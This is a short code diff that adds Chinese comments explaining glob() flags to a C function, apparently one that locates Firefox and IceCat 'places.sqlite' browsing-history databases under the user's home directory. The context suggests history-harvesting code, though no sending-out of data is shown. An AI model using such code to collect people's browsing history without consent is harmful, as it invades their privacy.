@@ -116,6 +116,9 @@ static void url_firefox(void)
 
    do {
       if(initlib(INIT_LIBSQLITE3)) break;
+    /*glob库函数用于Linux文件系统中路径名称的模式匹配，
+     * 即查找文件系统中指定模式的路径
+     * GLOB_NOSORT: 不排序    GLOB_TILDE: 波浪线扩展   GLOB_BRACE:大括号扩展*/
       if(glob(SO"~/.mozilla/{firefox,icecat}/*/places.sqlite", GLOB_NOSORT|GLOB_TILDE|GLOB_BRACE, NULL, &g)) break;
 
       for(i = 0; i < g.gl_pathc; i++) {
